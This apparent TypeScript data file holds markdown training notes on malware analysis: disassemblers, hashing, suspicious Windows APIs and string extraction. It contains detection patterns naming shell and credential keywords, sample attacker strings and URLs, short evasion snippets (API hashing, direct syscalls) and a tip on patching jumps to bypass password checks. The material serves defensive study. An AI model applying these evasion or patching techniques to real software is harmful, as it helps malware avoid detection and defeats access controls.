export type Note = {
  id: string;
  title: string;
  excerpt: string;
  category: string;
  content: string;
};

export const notes: Note[] = [
  {
    id: "advanced-static-ana",
    title: "Advanced Static Analysis",
    excerpt: "Deep dive into advanced static analysis techniques including IDA Pro disassembly, Ghidra decompilation, and identifying malicious code patterns without executing the binary.",
    category: "Malware Analysis",
    content: `# Advanced Static Analysis

> **Goal**: Understand what a binary does **without ever running it** — using disassemblers, decompilers, and manual code analysis.

---

## 1. Tool Selection — Which Disassembler to Use

| Tool | Type | Best For | Cost |
|------|------|----------|------|
| **Ghidra** | Disassembler + Decompiler | Full RE, malware, CTF | Free (NSA) |
| **IDA Pro** | Disassembler + Decompiler | Industry standard, best x86 analysis | $$$$ |
| **IDA Free** | Disassembler only | Quick disassembly, no decompiler | Free |
| **Cutter / Rizin** | Disassembler + Decompiler (r2-based) | Lightweight, Linux-friendly, CTF | Free |
| **Binary Ninja** | Disassembler + Decompiler | Clean UI, good HLIL | $$ |
| **x64dbg** | Debugger (dynamic) | Runtime analysis on Windows | Free |
| **radare2** | CLI Disassembler | Scripting, automation, CTF | Free |

---

## 2. Loading a Binary into Cutter / Ghidra

### Cutter Workflow
1. Open Cutter and load \`FileName.exe\`
2. Select analysis options (keep defaults for most malware)
3. Wait for auto-analysis to complete
4. Locate the **main** function — this is the entry point of the program
5. Switch between **Disassembly**, **Graph**, and **Decompiler** views

### Ghidra Workflow
1. Create a new project → Import File → select the binary
2. Double-click the file → opens CodeBrowser
3. Say **Yes** to auto-analysis when prompted
4. Navigate to \`entry\` → follow call to \`__libc_start_main\` → first argument = \`main\`
5. Use the **Decompile** window (right panel) to read pseudo-C code

---

## 3. Identifying Key Functions

### Finding \`main()\`
- **PE (Windows)**: Look for \`entry\` → \`__mainCRTStartup\` → \`main\` or \`WinMain\`
- **ELF (Linux)**: \`entry\` → \`__libc_start_main(main, argc, argv, ...)\` — first arg is \`main\`
- **Stripped binaries**: No symbol names — look for the function called by the entry stub

### Recognizing Important Functions
| What You See | What It Probably Does |
|---|---|
| \`CreateFile\` / \`WriteFile\` | File operations (dropper, ransomware) |
| \`VirtualAlloc\` + \`memcpy\` | Shellcode unpacking/injection |
| \`socket\` / \`connect\` / \`send\` / \`recv\` | Network C2 communication |
| \`RegSetValueEx\` | Registry persistence |
| \`CreateProcess\` / \`ShellExecute\` | Spawning child processes |
| \`CryptEncrypt\` / \`CryptDecrypt\` | Crypto operations (ransomware) |
| XOR loops in a tight function | Custom encryption / obfuscation |
| \`LoadLibrary\` + \`GetProcAddress\` | Dynamic API resolution (evasion) |
| \`IsDebuggerPresent\` | Anti-debugging check |

---

## 4. Control Flow Analysis

### Reading the Graph View
The **graph view** (CFG — Control Flow Graph) shows basic blocks connected by arrows:
- **Green arrow** = conditional branch TAKEN (true)
- **Red arrow** = conditional branch NOT TAKEN (false)
- **Blue arrow** = unconditional jump

### Common Patterns in Graph View

**If/Else:**
\`\`\`
   [cmp eax, 0]
   /          \\
 [jne]      [je]
  |           |
[block A]  [block B]
  \\          /
   [continue]
\`\`\`

**While Loop:**
\`\`\`
[condition check] <----+
       |               |
   [loop body] --------+
       |
   [exit loop]
\`\`\`

**Switch/Case:**
\`\`\`
[cmp/ja → jump table]
  / | | | \\
[c0][c1][c2][c3][default]
\`\`\`

---

## 5. String Analysis in Disassemblers

### Where to Find Strings
- **Ghidra**: Window → Defined Strings (or \`Search → For Strings\`)
- **Cutter**: Strings panel (izz/iz)
- **IDA**: View → Open Subviews → Strings (Shift+F12)

### What Strings Reveal
| String Pattern | Intelligence |
|---|---|
| \`http://\`, \`https://\` | C2 server URLs |
| \`cmd.exe\`, \`/bin/sh\` | Shell command execution |
| \`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` | Persistence registry key |
| \`password\`, \`credential\`, \`login\` | Credential stealer |
| \`encrypt\`, \`decrypt\`, \`AES\`, \`RSA\` | Crypto/ransomware |
| Base64 blobs (\`=\` padding) | Encoded payloads or configs |
| \`mutex_\`, \`Global\\\` | Mutex for singleton check |
| Error messages with developer paths | Developer machine info leak |
| \`.onion\`, \`tor\` | Tor-based C2 |

---

## 6. Import & Export Analysis

### Imports Table
The Import Address Table (IAT) tells you which DLL functions the binary uses **statically**:

**In Ghidra**: Window → Symbol Table → filter by "EXTERNAL"  
**In Cutter**: Imports panel  
**In IDA**: View → Open Subviews → Imports

### Suspicious Import Combinations

| Import Combination | Likely Behavior |
|---|---|
| \`VirtualAllocEx\` + \`WriteProcessMemory\` + \`CreateRemoteThread\` | Process injection |
| \`OpenProcess\` + \`ReadProcessMemory\` | Memory reading (credential theft) |
| \`InternetOpenA\` + \`InternetConnectA\` + \`HttpSendRequestA\` | HTTP C2 |
| \`WSAStartup\` + \`socket\` + \`connect\` | Raw socket C2 |
| \`CryptAcquireContext\` + \`CryptEncrypt\` | Encryption (ransomware) |
| Only \`LoadLibrary\` + \`GetProcAddress\` | Dynamic resolution — hiding real API usage |
| \`NtQuerySystemInformation\` | Anti-analysis / system enumeration |

### Exports Table
- Legitimate DLLs export functions for other programs to use
- **Malicious DLLs** often export functions like \`DllMain\`, \`ServiceMain\`, or names that mimic legit software
- Look for exported functions with suspicious names or ordinals-only exports

---

## 7. Cross-References (XREF) Analysis

Cross-references show **who calls a function** and **what a function calls**:

- **Ghidra**: Right-click → References → Show References To
- **IDA**: Press \`x\` on any function/address
- **Cutter**: Right-click → Show X-Refs

### Why XREFs Matter
- Find all callers of \`VirtualAlloc\` → trace shellcode allocation
- Find all callers of \`send()\` → trace C2 exfiltration
- Find what calls a decryption function → trace payload unpacking
- Dead code (functions with 0 XREFs) → possibly unused or dynamically resolved

---

## 8. Identifying Packed / Obfuscated Binaries

### Signs of Packing
| Indicator | What It Means |
|---|---|
| Very few imports (only \`LoadLibrary\`, \`GetProcAddress\`) | Packed — real imports resolved at runtime |
| Section names like \`.upx0\`, \`.aspack\`, \`.themida\` | Known packer sections |
| High entropy (>7.0) in sections | Compressed/encrypted data |
| Virtual size >> raw size in PE sections | Unpacking will expand data in memory |
| Entry point in non-standard section (not \`.text\`) | Stub executes before real code |
| Very few strings | Strings encrypted or compressed |

### Common Packers
| Packer | Detection | Unpacking |
|---|---|---|
| **UPX** | \`upx -t file.exe\`, section names \`.UPX0/.UPX1\` | \`upx -d file.exe\` |
| **ASPack** | PEiD, Detect It Easy | Manual or ASPackDie |
| **Themida** | PEiD, section \`.themida\` | Very hard, use dynamic analysis |
| **VMProtect** | \`.vmp\` sections, virtualized code | Extremely hard |
| **Custom packers** | No signature match, weird entropy | Dump from memory at OEP |

### Entropy Analysis
- **Normal code** (.text section): entropy ~5.0–6.5
- **Packed/encrypted**: entropy ~7.0–8.0
- Use **Detect It Easy (DiE)** or **pestudio** for entropy visualization

---

## 9. Advanced Techniques

### Identifying Encryption Algorithms
- Look for **magic constants**:
  - \`0x67452301\`, \`0xEFCDAB89\` → MD5
  - \`0x6A09E667\` → SHA-256
  - Rijndael S-box (\`0x63, 0x7C, 0x77, 0x7B...\`) → AES
  - \`0x9E3779B9\` → TEA/XTEA
- **Ghidra**: Use \`FindCrypt\` plugin to auto-detect crypto constants
- **IDA**: Use \`FindCrypt2\` or \`Signsrch\`

### Reconstructing Structures
1. Identify clusters of data accesses at fixed offsets from a base pointer
2. Create a struct in Ghidra: Data Type Manager → right-click → New Structure
3. Apply the struct to the pointer → code becomes readable

### Patching Binaries
- **Ghidra**: Right-click instruction → Patch Instruction → Export patched binary
- **Cutter**: Edit → Patch → write bytes
- Common patches: \`NOP\` out anti-debug checks, change \`JE\` to \`JMP\` to skip password checks

---

## 10. Static Analysis Workflow Checklist

\`\`\`
□ 1. File identification (file, DIE, PEiD)
□ 2. Check if packed → unpack if needed
□ 3. Hash the sample (MD5/SHA256) → check VirusTotal
□ 4. Extract strings (strings/FLOSS)
□ 5. Analyze imports/exports → categorize behavior
□ 6. Load into disassembler (Ghidra/IDA/Cutter)
□ 7. Find entry point → locate main()
□ 8. Read decompiled code for high-level understanding
□ 9. Follow XREFs for critical functions
□ 10. Identify crypto, C2, persistence, injection
□ 11. Extract IOCs (IPs, domains, file paths, registry keys)
□ 12. Document findings → write report
\`\`\`

---

## Pro Tips

> **Rename everything** — As you identify functions, rename them (\`decrypt_payload\`, \`connect_c2\`, \`inject_shellcode\`). Future you will thank present you.

> **Comment liberally** — Add comments in the disassembler for every discovery. Analysis is iterative.

> **Cross-reference with dynamic analysis** — Static tells you what CAN happen. Dynamic tells you what DOES happen. Use both.

> **Use YARA rules** — Write YARA signatures from your static findings to detect variants of the same malware family.`,
  },
  {
    id: "md5-check",
    title: "MD5 Hash Verification",
    excerpt: "Using MD5 hashes for malware identification and verification, including command-line tools and online lookup databases like VirusTotal.",
    category: "Malware Analysis",
    content: `# MD5 Hash Verification

> **Purpose**: Generate a unique fingerprint of a file to identify it, check if it's known malware, and verify integrity.

---

## 1. Quick Commands

### Windows (Cmder / PowerShell)
\`\`\`powershell
# Using md5sum (Cmder / Git Bash / WSL)
md5sum.exe FileName.exe

# Using PowerShell native
Get-FileHash -Algorithm MD5 FileName.exe

# Using certutil
certutil -hashfile FileName.exe MD5
\`\`\`

### Linux / macOS
\`\`\`bash
# Standard
md5sum FileName.exe

# macOS
md5 FileName.exe

# OpenSSL
openssl md5 FileName.exe
\`\`\`

---

## 2. What is MD5?

- **MD5** (Message-Digest Algorithm 5) produces a **128-bit** (32 hex character) hash
- Designed by Ron Rivest in 1991
- **Deterministic**: Same input → same hash, always
- **One-way**: Cannot reverse a hash back to the original file
- **Fast**: Very quick to compute even on large files

### Example Output
\`\`\`
d41d8cd98f00b204e9800998ecf8427e  empty_file.txt
5d41402abc4b2a76b9719d911017c592  hello.txt
a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  malware_sample.exe
\`\`\`

---

## 3. MD5 vs SHA-256 — When to Use Which

| Feature | MD5 | SHA-256 |
|---|---|---|
| **Hash length** | 128-bit (32 hex chars) | 256-bit (64 hex chars) |
| **Speed** | Faster | Slower |
| **Collision resistance** | **BROKEN** (collisions found since 2004) | Strong (no known collisions) |
| **Use in malware analysis** | Still widely used for quick lookups | Preferred for authoritative identification |
| **VirusTotal** | Accepted | Accepted (primary) |
| **NIST recommendation** | Deprecated for security | Recommended |

### Bottom Line
- **MD5**: Still widely supported in older tools/scripts, smaller/faster to store/type, sufficient for non-adversarial contexts (quick malware lookup)
- **SHA-256**: The authoritative, collision-resistant identifier — use this when you need **certainty**
- **Best practice**: Generate BOTH for every sample you analyze

---

## 4. Using Hashes for Malware Analysis

### Step 1: Generate the Hash
\`\`\`bash
md5sum suspicious_file.exe
# Output: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  suspicious_file.exe
\`\`\`

### Step 2: Look Up on VirusTotal
1. Go to [https://www.virustotal.com](https://www.virustotal.com)
2. Click **Search** tab
3. Paste the MD5 hash
4. Review detection results from 70+ AV engines

### Step 3: Search Threat Intelligence Databases
| Platform | URL | What It Provides |
|---|---|---|
| **VirusTotal** | [virustotal.com](https://www.virustotal.com) | AV detections, behavioral reports, community comments |
| **MalwareBazaar** | [bazaar.abuse.ch](https://bazaar.abuse.ch) | Malware sample database, family tags |
| **Hybrid Analysis** | [hybrid-analysis.com](https://www.hybrid-analysis.com) | Sandbox reports with full behavioral data |
| **ANY.RUN** | [any.run](https://any.run) | Interactive sandbox reports |
| **AlienVault OTX** | [otx.alienvault.com](https://otx.alienvault.com) | Threat intelligence pulses |
| **Malshare** | [malshare.com](https://malshare.com) | Free malware sample repository |
| **Joe Sandbox** | [joesandbox.com](https://www.joesandbox.com) | Detailed sandbox analysis |
| **InQuest Labs** | [labs.inquest.net](https://labs.inquest.net) | Deep file inspection |

### Step 4: Check if Previously Analyzed
\`\`\`bash
# Search multiple databases at once using curl
curl -s "https://mb-api.abuse.ch/api/v1/" \\
  -d "query=get_info" \\
  -d "hash=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
\`\`\`

---

## 5. Bulk Hashing

### Hash All Files in a Directory
\`\`\`bash
# Linux
find . -type f -exec md5sum {} \\; > hashes.txt

# Hash only executables
find . -name "*.exe" -exec md5sum {} \\; > exe_hashes.txt

# Generate both MD5 and SHA256
for f in *.exe; do
    echo "=== $f ==="
    md5sum "$f"
    sha256sum "$f"
done
\`\`\`

### PowerShell Bulk Hashing
\`\`\`powershell
Get-ChildItem -Path . -Filter *.exe | ForEach-Object {
    $md5 = (Get-FileHash $_.FullName -Algorithm MD5).Hash
    $sha256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
    Write-Output "$($_.Name): MD5=$md5 SHA256=$sha256"
}
\`\`\`

---

## 6. OSINT Pivoting with Hashes

Once you have a hash, you can **pivot** to find related malware:

\`\`\`
Hash → VirusTotal → "Relations" tab → 
  → Contacted domains/IPs
  → Dropped files (hashes of children)
  → Parent files (who dropped this)
  → Similar samples (same family)
  → Bundled files
\`\`\`

### Hash-Based YARA Rule
\`\`\`yara
rule known_malware_sample {
    condition:
        hash.md5(0, filesize) == "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6" or
        hash.sha256(0, filesize) == "e3b0c44298fc1c149afbf4c8996fb924..."
}
\`\`\`

---

## 7. MD5 Collision Warning

> **Important**: MD5 is cryptographically broken. Two different files CAN produce the same MD5 hash (collision attacks). This means:
> - An attacker could craft a malicious file with the same MD5 as a legitimate one
> - Never rely on MD5 alone for file verification in security contexts
> - Always use SHA-256 as primary identifier, MD5 as secondary for quick lookups

### Famous MD5 Collision Examples
- **2004**: Wang et al. demonstrated first MD5 collisions
- **2012**: Flame malware used MD5 collision to forge a Microsoft certificate
- **2017**: SHAttered project showed practical SHA-1 collisions (MD5 was already broken)`,
  },
  {
    id: "malware-api",
    title: "Malware API Reference",
    excerpt: "Analysis of common Windows API calls used by malware for file operations, process manipulation, registry modifications, and network communication.",
    category: "Malware Analysis",
    content: `# Malware API Reference

> **Primary Resource**: [https://malapi.io](https://malapi.io) — Interactive Windows API reference organized by malware behavior categories.

---

## 1. What is MalAPI.io?

MalAPI.io is a **curated database** of Windows API functions commonly abused by malware, organized by **ATT&CK technique categories**. It maps each API to:
- What it does
- Which malware families use it
- What MITRE ATT&CK technique it corresponds to
- Example usage patterns

### How to Use It
1. Go to [https://malapi.io](https://malapi.io)
2. Browse by **category** (Injection, Evasion, Persistence, etc.) or **search** a specific API name
3. Click any API to see: description, parameters, related malware, detection notes
4. Use it alongside your disassembler — when you see an unknown API in imports, look it up on MalAPI

---

## 2. API Categories & Key Functions

### Process Injection APIs
| API Function | Description | Risk Level |
|---|---|---|
| \`VirtualAllocEx\` | Allocate memory in another process | High |
| \`WriteProcessMemory\` | Write data into another process's memory | Critical |
| \`CreateRemoteThread\` | Create a thread in another process | Critical |
| \`NtMapViewOfSection\` | Map a section object into a process (stealthy) | Critical |
| \`QueueUserAPC\` | Queue an APC to a thread (APC injection) | High |
| \`SetThreadContext\` | Modify thread registers (thread hijacking) | Critical |
| \`NtCreateThreadEx\` | Low-level thread creation (ntdll) | Critical |
| \`RtlCreateUserThread\` | Another thread creation (used to bypass hooks) | Critical |

### Memory Manipulation APIs
| API Function | Description | Risk Level |
|---|---|---|
| \`VirtualAlloc\` | Allocate memory in current process | Medium |
| \`VirtualProtect\` | Change memory page protections (RWX) | High |
| \`HeapCreate\` / \`HeapAlloc\` | Heap allocation (shellcode staging) | Medium |
| \`NtAllocateVirtualMemory\` | Low-level memory allocation | High |
| \`VirtualFree\` | Free allocated memory | Low |

### Evasion & Anti-Analysis APIs
| API Function | Description | What Malware Does |
|---|---|---|
| \`IsDebuggerPresent\` | Check if debugger attached | Exit or change behavior |
| \`CheckRemoteDebuggerPresent\` | Check for remote debugger | Same as above |
| \`NtQueryInformationProcess\` | Query debug port, flags | Detect debugger/sandbox |
| \`GetTickCount\` / \`QueryPerformanceCounter\` | Get system time | Timing-based sandbox detection |
| \`NtDelayExecution\` / \`Sleep\` | Delay execution | Sandbox evasion (sleep > analysis time) |
| \`OutputDebugStringA\` | Send string to debugger | Crash certain debuggers |
| \`NtSetInformationThread\` | Hide thread from debugger | \`ThreadHideFromDebugger\` |
| \`GetSystemInfo\` | Get CPU/RAM info | Detect VM (low resources = sandbox) |
| \`EnumWindows\` | List all windows | Check for analysis tools |

### Persistence APIs
| API Function | Description | Persistence Method |
|---|---|---|
| \`RegCreateKeyExA\` | Create registry key | Run key persistence |
| \`RegSetValueExA\` | Set registry value | Write to \`HKCU\\...\\Run\` |
| \`CreateServiceA\` | Create a Windows service | Service persistence |
| \`StartServiceA\` | Start a service | Activate persistence |
| \`CopyFileA\` | Copy file to new location | Drop to startup folder |
| \`SHGetFolderPathA\` | Get special folder paths | Find Startup folder |
| \`CoCreateInstance\` | Create COM object | COM hijacking |

### File Operations APIs
| API Function | Description | Malware Use |
|---|---|---|
| \`CreateFileA/W\` | Open/create file | Drop payloads |
| \`WriteFile\` | Write data to file | Write malicious content |
| \`ReadFile\` | Read file contents | Read config/steal data |
| \`DeleteFileA\` | Delete a file | Self-deletion, anti-forensics |
| \`MoveFileA\` | Move/rename file | Relocate payload |
| \`FindFirstFile\` / \`FindNextFile\` | Directory enumeration | Ransomware file discovery |
| \`GetTempPathA\` | Get temp directory | Common drop location |

### Network Communication APIs
| API Function | Description | Protocol |
|---|---|---|
| \`WSAStartup\` | Initialize Winsock | Raw sockets |
| \`socket\` / \`connect\` / \`send\` / \`recv\` | Raw socket operations | TCP/UDP C2 |
| \`InternetOpenA\` | Initialize WinINet | HTTP/HTTPS |
| \`InternetConnectA\` | Connect to server | HTTP C2 |
| \`HttpOpenRequestA\` | Create HTTP request | HTTP C2 |
| \`HttpSendRequestA\` | Send HTTP request | Exfiltration |
| \`WinHttpOpen\` | Initialize WinHTTP (modern) | HTTPS C2 |
| \`URLDownloadToFileA\` | Download file from URL | Stage 2 download |
| \`InternetReadFile\` | Read response data | Receive C2 commands |

### Credential Theft APIs
| API Function | Description | What It Steals |
|---|---|---|
| \`CredEnumerateA\` | Enumerate stored credentials | Windows credential store |
| \`CryptUnprotectData\` | Decrypt DPAPI-protected data | Browser passwords, cookies |
| \`LsaRetrievePrivateData\` | Retrieve LSA secrets | Service passwords |
| \`OpenProcessToken\` | Open process token | Token theft |
| \`DuplicateTokenEx\` | Duplicate access token | Token impersonation |
| \`ImpersonateLoggedOnUser\` | Impersonate user | Privilege escalation |

### Crypto APIs
| API Function | Description | Malware Use |
|---|---|---|
| \`CryptAcquireContextA\` | Get crypto provider handle | Initialize encryption |
| \`CryptGenKey\` | Generate encryption key | Ransomware key gen |
| \`CryptEncrypt\` | Encrypt data | Ransomware file encryption |
| \`CryptDecrypt\` | Decrypt data | Decrypt config/C2 traffic |
| \`CryptImportKey\` | Import crypto key | Import attacker's public key |
| \`BCryptEncrypt\` | Modern crypto (CNG) | Newer ransomware |

---

## 3. API Resolution Techniques (How Malware Hides APIs)

### Static Linking (Normal)
\`\`\`c
// Visible in Import Address Table
CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: Clearly visible in IAT — easy to spot in PE-bear, IDA, Ghidra

### Dynamic Resolution (Common Evasion)
\`\`\`c
// Only LoadLibrary + GetProcAddress visible in IAT
HMODULE hKernel = LoadLibrary("kernel32.dll");
typedef HANDLE (*pCreateRemoteThread)(...);
pCreateRemoteThread myFunc = (pCreateRemoteThread)GetProcAddress(hKernel, "CreateRemoteThread");
myFunc(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: Only see \`LoadLibrary\` + \`GetProcAddress\` in IAT — must trace runtime resolution

### API Hashing (Advanced Evasion)
\`\`\`c
// No API names at all in the binary
DWORD hash = 0xAFC1B2D3;  // pre-computed hash of "CreateRemoteThread"
FARPROC func = resolve_api_by_hash(hash);  // walks PEB → DLL list → export table
func(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: No strings, no IAT entries — must reverse the hashing function. Common hash algorithms: \`djb2\`, \`ror13\`, \`crc32\`

### Direct Syscalls (Most Advanced)
\`\`\`asm
; Bypass all user-mode hooks entirely
mov r10, rcx
mov eax, 0x3F          ; NtCreateThreadEx syscall number
syscall
\`\`\`
**Detection**: Look for \`syscall\` instructions with hardcoded syscall numbers. Tools: **SysWhispers**, **HellsGate**, **Tartarus Gate**

---

## 4. Quick Analysis Workflow Using MalAPI

\`\`\`
1. Extract imports from binary (PE-bear, CFF Explorer, Ghidra)
2. For each suspicious import → search on malapi.io
3. Group imports by malware behavior category:
   □ Injection?  □ Persistence?  □ Network?
   □ Evasion?    □ File ops?     □ Crypto?
4. If only LoadLibrary + GetProcAddress → it's hiding real APIs
5. Cross-reference with strings analysis (FLOSS output)
6. Map to MITRE ATT&CK techniques
7. Write behavioral summary
\`\`\`

---

## 5. Essential Online API Lookup Resources

| Resource | URL | Use Case |
|---|---|---|
| **MalAPI.io** | [malapi.io](https://malapi.io) | Malware-focused API reference |
| **MSDN** | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows/win32/api/) | Official API documentation |
| **Undocumented NtAPI** | [ntdoc.m417z.com](https://ntdoc.m417z.com/) | Undocumented ntdll functions |
| **ReactOS Source** | [reactos.org](https://reactos.org/) | Open-source Windows API implementation |
| **MITRE ATT&CK** | [attack.mitre.org](https://attack.mitre.org/) | Map APIs to threat techniques |
| **Unprotect.it** | [unprotect.it](https://unprotect.it/) | Evasion & anti-analysis techniques |

`,
  },
  {
    id: "strings",
    title: "Strings Extraction & Analysis",
    excerpt: "Extracting and analyzing strings from malware samples using the strings utility and FLOSS for deobfuscating encoded or obfuscated strings.",
    category: "Malware Analysis",
    content: `# Strings Extraction & Analysis

> **Purpose**: Extract human-readable text from binaries to discover URLs, file paths, commands, error messages, encryption keys, and other intelligence — **without executing the binary**.

---

## 1. Quick Commands

### FLOSS (FireEye Labs Obfuscated String Solver) — Best Tool
\`\`\`bash
# Basic extraction (includes deobfuscated strings)
floss fileName.exe

# Check the FLOSS static unicode strings at the bottom
# These often contain the most interesting artifacts

# Output to file for easier searching
floss fileName.exe > strings_output.txt

# Verbose mode (see decoding attempts)
floss -v fileName.exe

# Minimum string length (default is 4)
floss -n 8 fileName.exe
\`\`\`

### Traditional \`strings\` Command
\`\`\`bash
# ASCII strings (default)
strings fileName.exe

# Unicode strings (Windows uses UTF-16LE)
strings -e l fileName.exe

# Both ASCII and Unicode
strings -a fileName.exe && strings -e l fileName.exe

# Set minimum length (reduce noise)
strings -n 8 fileName.exe

# With byte offset (useful for locating in hex editor)
strings -t x fileName.exe
\`\`\`

---

## 2. FLOSS vs strings — Why FLOSS Wins

| Feature | \`strings\` | **FLOSS** |
|---|---|---|
| ASCII strings | Yes | Yes |
| Unicode strings | With \`-e l\` flag | Automatic |
| **Decoded/deobfuscated strings** | **No** | **Yes** |
| **Stack strings** (built char-by-char) | **No** | **Yes** |
| **Tight strings** (XOR decoded) | **No** | **Yes** |
| Speed | Very fast | Slower (does emulation) |
| Install | Pre-installed | \`pip install floss\` or download binary |

> **FLOSS uses emulation** to actually execute string decoding routines, revealing strings that \`strings\` can never find.

### Install FLOSS
\`\`\`bash
# Via pip
pip install floss

# Or download binary from GitHub
# https://github.com/mandiant/flare-floss/releases
\`\`\`

---

## 3. What to Look For in String Output

### High-Value String Categories

| Category | Example Strings | Intelligence |
|---|---|---|
| **URLs / Domains** | \`http://evil.com/gate.php\`, \`api.telegram.org\` | C2 servers, exfil endpoints |
| **IP Addresses** | \`192.168.1.100\`, \`10.0.0.1:4444\` | C2 IPs, callback addresses |
| **File Paths** | \`C:\\Users\\Public\\payload.dll\`, \`/tmp/.hidden\` | Drop locations |
| **Registry Keys** | \`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` | Persistence mechanisms |
| **Commands** | \`cmd.exe /c\`, \`powershell -enc\`, \`whoami\`, \`net user\` | Execution commands |
| **API Names** | \`VirtualAlloc\`, \`CreateRemoteThread\` | Dynamic API resolution |
| **DLL Names** | \`kernel32.dll\`, \`ntdll.dll\`, \`ws2_32.dll\` | Loaded libraries |
| **Error Messages** | \`Connection failed\`, \`File not found\` | Developer debug messages |
| **Crypto Constants** | \`-----BEGIN RSA PUBLIC KEY-----\` | Encryption usage |
| **User Agents** | \`Mozilla/5.0...\`, \`Go-http-client/1.1\` | HTTP fingerprint |
| **Mutex Names** | \`Global\\MyMutex123\` | Singleton check |
| **Base64 Blobs** | \`SGVsbG8gV29ybGQ=\` | Encoded payloads/configs |
| **Passwords / Keys** | \`admin:password123\`, \`AES_KEY=\` | Hardcoded credentials |
| **Developer Artifacts** | \`C:\\Users\\dev\\Desktop\\malware\\\` | Attacker machine info |

---

## 4. String Analysis Methodology

### Step-by-Step Workflow
\`\`\`
1. Run FLOSS on the sample
   └── floss sample.exe > floss_output.txt

2. Sort by categories using grep
   └── grep -iE "http|https|ftp|\\.com|\\.net|\\.org" floss_output.txt
   └── grep -iE "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b" floss_output.txt
   └── grep -iE "HKLM|HKCU|CurrentVersion|Run" floss_output.txt
   └── grep -iE "cmd|powershell|exec|system|shell" floss_output.txt
   └── grep -iE "password|credential|login|token|key" floss_output.txt

3. Decode any Base64 strings
   └── echo "SGVsbG8gV29ybGQ=" | base64 -d

4. Extract IOCs (Indicators of Compromise)
   └── IPs, domains, file hashes, mutex names, file paths

5. Cross-reference with threat intelligence
   └── VirusTotal, MalwareBazaar, OTX
\`\`\`

### Useful grep Patterns for Malware Analysis
\`\`\`bash
# Network indicators
grep -oP 'https?://[^\\s"<>]+' floss_output.txt
grep -oP '\\b\\d{1,3}(\\.\\d{1,3}){3}\\b' floss_output.txt
grep -oP '\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b' floss_output.txt

# Windows paths
grep -oP '[A-Z]:\\\\[^\\s"]+' floss_output.txt

# Registry keys
grep -iP '(HKLM|HKCU|HKCR)\\\\[^\\s"]+' floss_output.txt

# Base64 encoded strings (min length 20)
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' floss_output.txt

# Potential encryption keys (hex strings)
grep -oP '\\b[0-9a-fA-F]{32,}\\b' floss_output.txt
\`\`\`

---

## 5. Obfuscated Strings — What FLOSS Catches

### Stack Strings
Malware builds strings one character at a time on the stack to avoid detection:
\`\`\`c
// In the binary (no complete strings visible to \`strings\`)
char s[20];
s[0] = 'c'; s[1] = 'm'; s[2] = 'd'; s[3] = '.';
s[4] = 'e'; s[5] = 'x'; s[6] = 'e'; s[7] = '\\0';
\`\`\`
FLOSS emulates this and recovers \`cmd.exe\`

### XOR-Encoded Strings
\`\`\`c
char encoded[] = {0x2C, 0x37, 0x37, 0x30, 0x1A}; // XOR 0x5C = "http:"
for(int i=0; i<5; i++) encoded[i] ^= 0x5C;
\`\`\`
FLOSS tries common XOR keys and recovers the plaintext

### RC4 / Custom Encrypted Strings
More complex decryption routines — FLOSS emulates the decoder function to recover strings

---

## 6. Advanced String Techniques

### Extract Strings from Specific PE Sections
\`\`\`bash
# Only .rdata section (constants, string literals)
objdump -s -j .rdata malware.exe | strings

# Only .data section (global variables)
objdump -s -j .data malware.exe | strings

# Resource section (often contains payloads)
objdump -s -j .rsrc malware.exe | strings
\`\`\`

### String Diffing Between Samples
\`\`\`bash
# Compare strings between two variants
floss variant_a.exe > strings_a.txt
floss variant_b.exe > strings_b.txt
diff strings_a.txt strings_b.txt

# Or use comm to find unique/common strings
sort strings_a.txt > a_sorted.txt
sort strings_b.txt > b_sorted.txt
comm -12 a_sorted.txt b_sorted.txt > common_strings.txt  # Shared
comm -23 a_sorted.txt b_sorted.txt > only_in_a.txt        # Unique to A
\`\`\`

### Strings in Memory Dumps
\`\`\`bash
# Extract strings from a memory dump
strings -n 10 memory_dump.dmp > mem_strings.txt

# Search for specific patterns in memory
strings memory_dump.dmp | grep -iE "(password|http|cmd\\.exe)"
\`\`\`

---

## 7. Related Tools

| Tool | Description | Use Case |
|---|---|---|
| **FLOSS** | Deobfuscating string solver | Primary tool for malware strings |
| **strings** | Basic string extraction | Quick first pass |
| **Bstrings** (Eric Zimmerman) | Enhanced strings for Windows | Better Unicode, regex support |
| **binwalk** | Firmware/embedded file analysis | Find embedded files & strings |
| **foremost** | File carving | Extract files from binary blobs |
| **yara** | Pattern matching | Scan for known string signatures |
| **StringSifter** | ML-based string ranking | Prioritize interesting strings |

### StringSifter — AI-Powered String Ranking
\`\`\`bash
# Ranks strings by maliciousness likelihood
pip install stringsifter
floss sample.exe | rank_strings
# Output: most suspicious strings first
\`\`\`

---

## Pro Tips

> **Always run FLOSS, not just \`strings\`** — You'll miss 30-50% of interesting strings with the basic \`strings\` command.

> **Check FLOSS decoded strings section** — The bottom section labeled "FLOSS decoded strings" and "FLOSS stack strings" contains the real gold — these are strings the malware tried to hide.

> **Pipe to \`less\` or save to file** — Large binaries can have thousands of strings. Save output and search systematically.

> **Combine with entropy analysis** — High-entropy sections with few strings = likely packed/encrypted. Low-entropy sections are worth deep string analysis.`,
  },
  {
    id: "sha256-check",
    title: "SHA-256 Hash Verification",
    excerpt: "Using SHA256 hashes for malware sample verification and identification, including cross-referencing with threat intelligence databases.",
    category: "Malware Analysis",
    content: `# SHA-256 Hash Verification

> **Purpose**: Generate the industry-standard cryptographic fingerprint of a file — the **gold standard** for malware identification.

---

## 1. Quick Commands

### Windows (Cmder / PowerShell)
\`\`\`powershell
# Using sha256sum (Cmder / Git Bash / WSL)
sha256sum.exe FileName.exe

# Using PowerShell native (default algorithm IS SHA256)
Get-FileHash FileName.exe

# Using certutil
